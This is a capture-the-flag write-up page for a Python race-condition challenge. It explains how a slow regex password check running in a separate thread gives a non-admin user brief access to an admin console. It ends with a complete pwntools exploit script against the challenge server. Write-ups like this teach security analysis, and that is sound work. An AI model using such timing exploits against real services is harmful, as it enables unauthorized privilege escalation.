@@ -1,0 +1,102 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Off To The Races 300pts</h1>
+            <h2>July 2021</h2>
+            <h4>Python Race Condition</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    They say that gambling leads to regrets, but we'll see. This online portal lets you bet on horse races, and if you can guess the admin password, you can collect all the money people lose, too. Maybe you'll collect enough to buy the flag? <a href=../../docs/imaginary/races.py>races.py</a>
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a python script to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br>
+    	I found this challenge pretty interesting. There are 2 privilege levels (user & admin). The user can either place a bet or attempt to log into the admin account. The admin password is verified using a regex check. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/races1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        The password that I used to to bypass this check is: "ju5tneveeverl05e". Once admin we have access to a bigger console. This console allows us to either resolve the bets (allowing us to increase our balance), view our balance, buy the flag for $100, or log out. Now the obvious answer would be to just place some bets as the user, resolve them as the administrator, and then use the money to buy the flag. However if we attempt that we get an error."Admins aren't allowed to view the flag!" <br> As it turns out, admins have the menu option to buy the flag, but as long as the admin flag is set we have no way of viewing the flag. This means that we somehow need to have access to the admin console without being an admin. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/races2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        After browsing the source for a while I came accross an interesting line. Looking up the module documentation of the process() function reveals that it spawns an additional thread in which it executes this function which will then validate our password using the regex check. This is when I had an idea. By providing a large incorrect regex, we could abuse a race condition bug that would allow us to have access to the admin console for a few seconds while being a non admin user. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/races3.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        This ended up being the solution to the challenge. The full exploit script is posted below.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/races4.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+
+p=remote('chal.imaginaryctf.org',42016)
+
+good = "ju5tneveeverl05e"
+bad =  'ju5tnEvEE' + 'vEE'*30
+
+p.sendline('1')
+p.sendline('A')
+p.sendline('100')
+
+p.sendline('1')
+p.sendline('B')
+p.sendline('200')
+
+p.sendline('2')
+p.sendline(good)
+
+p.sendline('1')
+p.sendline('4')
+p.sendline(bad)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
